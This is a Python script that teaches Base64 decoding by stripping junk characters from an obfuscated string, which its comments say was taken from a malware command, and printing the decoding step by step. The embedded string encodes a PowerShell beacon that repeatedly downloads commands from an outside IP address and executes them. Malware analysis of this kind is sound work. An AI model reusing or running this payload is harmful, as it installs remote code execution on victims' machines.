#!/usr/bin/env python3
"""
This script demonstrates how to decode an obfuscated Base64 string.
It cleans the string by removing junk characters, adds necessary padding,
and then decodes it. Additionally, it visualizes the decoding process by
splitting the cleaned string into 4-character chunks, converting each
character to its 6-bit binary representation, and showing how these bits
are grouped into bytes.
"""

import base64

# Define the Base64 alphabet
BASE64_ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"


def char_to_binary(c):
    """
    Convert a single Base64 character to its 6-bit binary string.

    Args:
        c (str): A single Base64 character.

    Returns:
        str: A 6-bit binary representation of the character.
    """
    if c == '=':
        return '000000'  # Padding characters are represented as zero bits.
    index = BASE64_ALPHABET.index(c)
    return format(index, '06b')  # Convert the index to a 6-bit binary string.


def split_into_chunks(s, chunk_size=4):
    """
    Split the given string into chunks of specified size.

    Args:
        s (str): The string to split.
        chunk_size (int): The size of each chunk (default is 4).

    Returns:
        list: A list of string chunks.
    """
    return [s[i:i + chunk_size] for i in range(0, len(s), chunk_size)]


def add_padding(s):
    """
    Add Base64 padding ('=') to the string if its length is not a multiple of 4.

    Args:
        s (str): The cleaned Base64 string.

    Returns:
        str: The Base64 string with correct padding.
    """
    remainder = len(s) % 4
    if remainder != 0:
        s += '=' * (4 - remainder)
    return s


def visualize_decoding(chunks):
    """
    Visualize the decoding process for each 4-character Base64 chunk.

    For each chunk, it prints the 6-bit binary of each character,
    then groups them into a 24-bit block, splits into three 8-bit bytes,
    and shows the corresponding decimal and character values.

    Args:
        chunks (list): A list of 4-character Base64 chunks.
    """
    for idx, chunk in enumerate(chunks):
        print(f"\nChunk {idx:02}: {chunk}")
        # Print binary representation for each character in the chunk
        print("Binary of each character:")
        for c in chunk:
            print(f"  {c} → {char_to_binary(c)}")
        # Combine the 6-bit binaries to form a 24-bit block
        binary_block = ''.join([char_to_binary(c) for c in chunk])
        print("\n24-bit block:", binary_block)
        # Split the 24-bit block into three bytes (8 bits each)
        byte1 = binary_block[0:8]
        byte2 = binary_block[8:16]
        byte3 = binary_block[16:24]
        # Display each byte as binary, its integer value, and the corresponding character
        print("\nConverted bytes:")
        print(f"  Byte 1: {byte1} → {int(byte1, 2)} → {chr(int(byte1, 2))}")
        print(f"  Byte 2: {byte2} → {int(byte2, 2)} → {chr(int(byte2, 2))}")
        print(f"  Byte 3: {byte3} → {int(byte3, 2)} → {chr(int(byte3, 2))}")
        print("-" * 50)


def main():
    # Step 1: Paste the obfuscated Base64 string here.
    # This is the obfuscated payload extracted from the malware command.
    obfuscated = (
        "J;G;Z;z>b;y;A}9;I}E;5;l;d;y>1;P}Y>m}p}l;Y;3>Q}g}L>U;N;v>b}S>A;i}U}2;N}y}a}X>B>0;a}W}5>n>L;k>Z>p;b;G>V}T>e}"\
        "X}N;0}Z>W}1}P;Y;m;p>l>Y}3;Q;i>C;i;R>T>Z>X>J}p>Y>W>x>O;d;W}1}i>Z}X>I;g}P;S;A}k}Z>n;N>v;L}k;d;l;d}E}R}y>a;X;"\
        "Z>l;K>C}J}j;O}l}w;i>K}S>5>T}Z;X>J}p>Y;W;x;O;d}W>1}i}Z;X}I}K>J;F}N;l}c>m;l;h;b}E}5>1;b}W;J}l>c;i>A;9>I}C;J>"\
        "7}M}D}p;Y}f}S}I}g>L>W;Y}g;J>F>N>l}c}m}l>h;b>E>5}1;b>W;J;l;c;g}o;k}U;2}V;y>a>W}F>s}T}n;V}t}Y}m;V;y}I}D;0;g>W}"\
        "2>N;v>b}n>Z>l;c>n>R>d;O>j;p}0;b>2>l}u>d;D}Y}0;K}C}R}T>Z>X}J>p>Y>W;x>O>d;W>1}i}Z;X;I}s}M}T}Y>p>C}i}R;z}Z;X}J}"\
        "p;Y;W>w}g;P;S>A>k>U;2>V>y}a;W>F>s}T;n;V}t}Y}m>V}y}C>i}R;p}c>C}A}9>I;C;d}o>d}H}R}w}O}i>8>v>N}S>4>y>N>T}I>u;M}"\
        "T;U;z>L;j;I}0;M}S>8;n}C}i>R;1>c>m}w>g;P}S;A;k}a;X>A}r;J}H}N>l}c;m>l;h}b>A>o>k}c}y>A}9;I}E;5>l;d;y}1>P>Y>m;p}"\
        "l>Y}3}Q}g;U;3;l;z>d>G;V}t}L}k;5}l>d>C;5>X}Z>W;J}D}b}G;l}l;b}n;Q}K}d>2;h}p;b;G}U;g>K>C}R;0}c;n>V>l}K}S>B;7}C}"\
        "i>A>g;I>C;B;0>c;n}k}g>e>w}o;g;I>C;A>g>I>C;A>g}I>C;R>y;Z}X>N>1}b>H}Q>9}J>H;M}u;R;G>9>3}b}m}x>v>Y}W>R}T}d}H}J}"\
        "p}b}m}c}o>J>H}V}y;b;C;k;K}I>C>A>g>I;H;0;K>I;C}A}g}I;G}N}h;d>G}N>o}I>H;s;K;I>C;A}g;I}C;A;g>I>C;B>T}d}G>F;y}d}"\
        "C}1}T;b;G}V}l;c}C}A;t}c}y;A}1;C;i>A>g}I;C;A;g;I>C>A}g}Y;2}9>u>d}G;l;u}d;W;U}K>I}C>A}g;I>H>0}K}I;C>A;g;I>E>l}"\
        "u;d;m;9>r>Z;S}1;F>e}H;B;y}Z}X;N>z>a;W}9>u>I>C;R;y>Z>X;N;1}b}H;Q}K}I>C;A}g;I;F}N}0}Y>X;J;0>L>V>N}s}Z}W}V>w}I}"\
        "C;1>z>I}D;U;K>f;Q}o;=>"
    )

    # Step 2: Clean the obfuscated string by removing extraneous junk characters.
    # These characters were inserted to obfuscate the Base64 payload.
    for junk in [';', '}', '>', '[', '#']:
        obfuscated = obfuscated.replace(junk, '')

    print("🔹 After removing junk characters:\n", obfuscated, "\n")

    # Step 3: Ensure the cleaned string's length is a multiple of 4 by adding padding if necessary.
    obfuscated = add_padding(obfuscated)
    print("🔹 After adding necessary padding:\n", obfuscated, "\n")

    # Step 4: Split the cleaned string into 4-character chunks.
    chunks = split_into_chunks(obfuscated)
    print(chunks)
    print("🔹 4-character chunks (Base64 blocks):")
    for i, chunk in enumerate(chunks):
        print(f"  Chunk {i:02}: {chunk}")
        print("    Binary representation of each character in this chunk:")
        for c in chunk:
            print(f"      {c} → {char_to_binary(c)}")
        # Combine binary representations to form a 24-bit block.
        binary_block = ''.join([char_to_binary(c) for c in chunk])
        print("    24-bit binary block:", binary_block)
        # Break the 24-bit block into three 8-bit segments.
        byte1, byte2, byte3 = binary_block[:8], binary_block[8:16], binary_block[16:24]
        print("    Converted bytes:")
        print(f"      Byte 1: {byte1} → {int(byte1, 2)} → {chr(int(byte1, 2))}")
        print(f"      Byte 2: {byte2} → {int(byte2, 2)} → {chr(int(byte2, 2))}")
        print(f"      Byte 3: {byte3} → {int(byte3, 2)} → {chr(int(byte3, 2))}")
        print("-" * 50)

    # Step 5: Decode the complete Base64 string to get the original payload.
    try:
        decoded_bytes = base64.b64decode(obfuscated)
        decoded_script = decoded_bytes.decode('utf-8', errors='replace')
        print("\n✅ Decoded PowerShell Script:\n")
        print(decoded_script)
    except Exception as e:
        print(f"❌ Failed to decode the Base64 string: {e}")


if __name__ == "__main__":
    main()
